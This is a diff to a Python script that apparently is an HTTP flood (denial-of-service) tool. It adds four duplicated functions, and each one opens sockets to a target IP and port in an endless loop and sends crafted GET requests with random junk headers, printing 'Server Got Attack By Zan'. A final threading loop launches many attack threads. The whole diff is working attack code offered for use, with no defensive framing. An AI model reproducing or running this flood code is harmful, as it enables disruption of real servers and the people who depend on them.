@@ -489,6 +489,106 @@ def spoofer4():
               pass      
 
 
+def start1():
+  global useragents, acceptall, ref, socks5
+  global hh, byte2, socks2, byte3
+  hh = random._urandom(75006)
+  byte2 = random._urandom(34002)
+  xx = int(0)
+  byte3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
+  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
+  Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
+  acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
+  referrer = random.choice(ref)
+  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
+  while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_host))
+            for i in range(pack):
+                s.send(str.encode(main_host))
+            print("Server Got Attack By Zan ")
+        except:
+              pass
+def start2():
+  global useragents, acceptall, ref, socks5
+  global hh, byte2, socks2, byte3
+  hh = random._urandom(75006)
+  byte2 = random._urandom(34002)
+  xx = int(0)
+  byte3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
+  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
+  Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
+  acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
+  referrer = random.choice(ref)
+  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
+  while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_host))
+            for i in range(pack):
+                s.send(str.encode(main_host))
+            print("Server Got Attack By Zan ")
+        except:
+              pass
+def start5():
+  global useragents, acceptall, ref, socks5
+  global hh, byte2, socks2, byte3
+  hh = random._urandom(75006)
+  byte2 = random._urandom(34002)
+  xx = int(0)
+  byte3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
+  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
+  Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
+  acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
+  referrer = random.choice(ref)
+  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
+  while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_host))
+            for i in range(pack):
+                s.send(str.encode(main_host))
+            print("Server Got Attack By Zan ")
+        except:
+              pass
+def start4():
+  global useragents, acceptall, ref, socks5
+  global hh, byte2, socks2, byte3
+  hh = random._urandom(75006)
+  byte2 = random._urandom(34002)
+  xx = int(0)
+  byte3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
+  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
+  Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
+  acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
+  referrer = random.choice(ref)
+  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
+  while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_host))
+            for i in range(pack):
+                s.send(str.encode(main_host))
+            print("Server Got Attack By Zan ")
+        except:
+              pass
 def start():
   global useragents, acceptall, ref, socks5
   global hh, byte2, socks2, byte3
@@ -514,6 +614,7 @@ def start():
             print("Server Got Attack By Zan ")
         except:
               pass
+            
 for i in range(th):
   th1 = threading.Thread(target=start)
   th1.start()
